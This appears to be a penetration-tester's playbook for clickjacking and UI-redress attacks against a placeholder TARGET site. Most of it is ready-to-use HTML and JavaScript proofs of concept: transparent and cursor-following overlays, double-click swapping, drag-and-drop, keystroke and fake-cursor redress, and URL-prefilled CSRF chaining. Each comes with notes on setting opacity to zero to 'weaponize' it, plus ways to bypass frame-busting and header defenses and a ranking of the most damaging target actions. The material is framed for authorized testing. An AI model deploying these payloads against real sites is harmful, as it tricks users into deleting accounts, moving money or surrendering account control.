# Clickjacking framing PoC (step 3)
# Host locally; load in a browser carrying the victim's session (test account).
# Line up the decoy with the real control, confirm the click reaches it, screenshot both layers.

## Transparent-overlay PoC
```html
<!doctype html><meta charset=utf-8>
<style>
  #decoy { position:absolute; top:0; left:0; z-index:1; }   /* what the victim thinks they click */
  iframe  { position:absolute; top:0; left:0; width:1000px; height:800px;
            opacity:0.1; z-index:2; border:0; }              /* set opacity:0 to weaponize */
</style>
<div id=decoy><button style="position:absolute;top:320px;left:120px">Claim your prize</button></div>
<iframe src="https://TARGET/account/delete"></iframe>
```
Align the decoy button over the sensitive control (adjust top/left). Keep `opacity` visible (0.1)
for the PoC so the reviewer can SEE both layers; note that `opacity:0` is the real attack.

## Defense checks (step 2)
```
curl -sI https://TARGET/<sensitive-path> | grep -iE 'x-frame-options|content-security-policy'
```
- No `X-Frame-Options` AND no CSP `frame-ancestors` → frameable.
- `frame-ancestors 'self'` or `X-Frame-Options: DENY/SAMEORIGIN` → not frameable cross-origin (unless bypass).

## Notes
- Test the SENSITIVE route specifically — defenses are often set on some pages but missed on others.
- If frame-busting JS exists, check `sandbox` iframe attribute bypass (`sandbox="allow-forms"` without
  `allow-scripts` neuters busting JS).
- Pair with `csrf` when the framed action is a cross-site state change.

---

## Extended arsenal — clickjacking / UI redress
# Placeholders: TARGET = victim app/HOST. Host each PoC locally; load in a browser carrying the TEST-account
# session. Keep the overlay semi-visible (opacity 0.1-0.3) for the reviewer so BOTH layers are evidenced;
# note that opacity:0 is the weaponized form. Screenshot both layers + the resulting state. Scope + approval.

### Frameability test matrix (step 2 — what actually blocks framing)
| Response control | Framed cross-origin? |
|---|---|
| no `X-Frame-Options` AND no CSP `frame-ancestors` | YES — frameable |
| `X-Frame-Options: DENY` | no |
| `X-Frame-Options: SAMEORIGIN` | no (cross-origin) |
| `X-Frame-Options: ALLOW-FROM https://x` (legacy) | ignored by modern engines → often effectively frameable |
| CSP `frame-ancestors 'none'` | no |
| CSP `frame-ancestors 'self'` | no (cross-origin) |
| CSP `frame-ancestors https://*.TARGET.com` | frameable from any subdomain → chain subdomain XSS/takeover |
| CSP `frame-ancestors` absent but XFO present | XFO governs |
| header only in `Content-Security-Policy-Report-Only` | NOT enforced → frameable |
| JS frame-busting only (no headers) | often bypassable (see below) |
```bash
# Check the SENSITIVE route specifically, and error/redirect variants (defenses are frequently missed there).
for P in /account/delete /settings/email /oauth/authorize /404-does-not-exist; do
  echo "== $P"; curl -skI "https://TARGET$P" | grep -iE 'x-frame-options|content-security-policy'
done
```

### Cursor-following overlay (button is always under the pointer)
```html
<!doctype html><meta charset=utf-8>
<style>
  iframe{position:absolute;opacity:0.15;z-index:2;border:0;width:1200px;height:900px}  /* 0 to weaponize */
  #bait{position:fixed;z-index:1;padding:10px 16px;background:#8f8;pointer-events:none}
</style>
<div id="bait">Click to continue</div>
<iframe id="f" src="https://TARGET/account/delete"></iframe>
<script>
// Keep the real sensitive control pinned under the cursor so any click lands on it.
const OFFX=-60, OFFY=-18;                 // tune so the TARGET button sits under the pointer
addEventListener('mousemove',e=>{
  f.style.left=(e.clientX+OFFX)+'px'; f.style.top=(e.clientY+OFFY)+'px';
  bait.style.left=(e.clientX+8)+'px';  bait.style.top=(e.clientY+8)+'px';
});
</script>
```

### Double-click / "likejacking" timing
```html
<!-- Decoy invites a double-click; between the clicks, swap the iframe over the sensitive control so the
     second click lands on TARGET. Benign: use a reversible TEST action (e.g. toggle a test setting). -->
<style>iframe{position:absolute;opacity:0.1;z-index:5;border:0;width:900px;height:700px}
       #d{position:absolute;top:200px;left:200px;z-index:1}</style>
<button id="d">Double-click to win</button>
<iframe id="f" src="https://TARGET/settings/toggle-test" style="top:-2000px"></iframe>
<script>
let n=0;
document.getElementById('d').addEventListener('click',()=>{
  if(++n===1){ f.style.top='170px'; f.style.left='170px'; }   // reveal over the control before 2nd click
});
</script>
```

### Drag-and-drop redress (dropjacking — move attacker data INTO a framed field)
```html
<!-- Victim "drags" a token/string from an attacker element and drops it into a hidden framed input
     (e.g. seeding a reset/recipient field). Benign: drop a harmless marker into a TEST field, show it took. -->
<p draggable="true" ondragstart="event.dataTransfer.setData('text','attacker-test-marker')">
  Drag this badge to the box →</p>
<iframe src="https://TARGET/profile/notes-test"
        style="position:absolute;left:260px;top:0;opacity:0.2;width:600px;height:300px;border:0"></iframe>
```

### Keyboard redress / strokejacking
```html
<!-- Focus a hidden framed input, then a decoy prompts the victim to type; keystrokes land in the frame. -->
<style>iframe{position:absolute;opacity:0.05;left:0;top:0;width:700px;height:120px;border:0;z-index:2}</style>
<div style="z-index:1;position:relative">Type the code shown to verify you're human: ____</div>
<iframe id="f" src="https://TARGET/settings/display-name-test"></iframe>
<script>onload=()=>{ f.contentWindow && f.focus(); }</script>   <!-- cross-origin focus is limited; test per-engine -->
```

### Partial / scrolled reveal
```html
<!-- Show ONLY the sensitive button by sizing/scrolling the iframe so surrounding UI is clipped off-screen. -->
<div style="width:140px;height:44px;overflow:hidden;position:absolute;top:300px;left:200px;opacity:0.25">
  <iframe src="https://TARGET/account/delete" scrolling="no"
          style="border:0;width:1200px;height:900px;margin-left:-520px;margin-top:-360px"></iframe>
</div>
```

### X-Frame-Options / CSP `frame-ancestors` bypass considerations
```
# - Per-page gaps: headers set on the app shell but MISSING on the sensitive endpoint, on error/redirect
#   pages, on legacy/API/print routes, or on a differently-configured host/CDN. Test the exact sensitive URL.
# - Report-Only CSP: frame-ancestors in CSP-Report-Only is NOT enforced → frameable.
# - ALLOW-FROM (legacy XFO) is ignored by modern browsers → if that's the only control, it's effectively open.
# - frame-ancestors with a subdomain wildcard (*.TARGET.com) → frame from a subdomain you can XSS / take over.
# - Double-framing: legacy ALLOW-FROM only checked the top frame → nest TARGET inside an allowed middle frame.
# - CSP typos / wrong directive (frame-src vs frame-ancestors; frame-ancestors doesn't fall back to default-src
#   but some stacks mis-set it) → verify the directive is the RIGHT one and enforced.
```

### JS frame-busting bypass (no headers, script-only defense)
```
# - sandbox without allow-scripts: <iframe sandbox="allow-forms"> neuters top.location busting JS while
#   still letting the victim submit the framed form.
# - 204 flush: on each busting navigation attempt, point a helper frame at a URL returning 204 No Content so
#   the top never actually navigates away.
# - onbeforeunload prompt: register beforeunload so the bust navigation asks the victim and can be cancelled.
# - restricted/sandboxed top: some busting checks (self!=top) are defeated when the top can't be read
#   cross-origin. Confirm the specific buster, then pick the matching neutraliser.
```

### Cursorjacking (fake cursor offset)
```html
<!-- Hide the real cursor; draw a fake one at an offset so the victim aims the fake while the real pointer is
     over the sensitive control. Benign PoC only. -->
<style>html{cursor:none} #fake{position:fixed;width:16px;height:16px;pointer-events:none;z-index:9}</style>
<img id="fake" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16'%3E%3Cpath d='M0 0l6 16 3-7 7-3z' fill='%23000'/%3E%3C/svg%3E">
<iframe src="https://TARGET/account/delete" style="position:absolute;opacity:0.2;border:0;width:1000px;height:800px"></iframe>
<script>const DX=40,DY=40;addEventListener('mousemove',e=>{fake.style.left=(e.clientX+DX)+'px';fake.style.top=(e.clientY+DY)+'px';});</script>
```

### Prefilled-action chaining (clickjacking + CSRF via URL params)
```
# If the sensitive action accepts its parameters via the URL (GET-prefill), frame the action already filled
# with attacker-test values so a single redressed click both authorizes AND supplies the payload:
#   <iframe src="https://TARGET/account/transfer?to=attacker-test&amount=1"></iframe>
# This is the clickjacking-assisted CSRF case: the framed page carries its OWN valid anti-CSRF token, which a
# blind cross-site POST couldn't forge. Cross-ref: csrf skill.
```

### Sensitive-action targeting checklist (what makes a frameable page a real finding)
```
# Rank frameable routes by the one-click damage a redressed click causes:
#   account takeover : change email / change password / disable 2FA / add recovery method / link OAuth
#   privilege        : accept an invite / grant a role / approve a permission / OAuth consent (/authorize)
#   money/data       : transfer / purchase / delete account or data / publish / share externally
#   nuisance         : logout / like / follow  (low severity)
# A frameable page with NO state-changing single-click action = informational, not a finding (verify.md).
```

### Mobile tapjacking (note)
```
# The same redress on touch devices ("tapjacking") overlays a transparent WebView/activity over a sensitive
# tap target. For native apps this routes to the mobile skill; for mobile-web it's the overlay PoC above
# sized to the viewport. Benign TEST-action proof only.
```

### Benign evidence to capture
```
# poc/<id>/: framing.html, headers.txt (XFO/CSP for the exact route), overlay.png (both layers visible),
#            result.png (TEST-account state after the redressed click), notes.md (alignment + reversal).
```
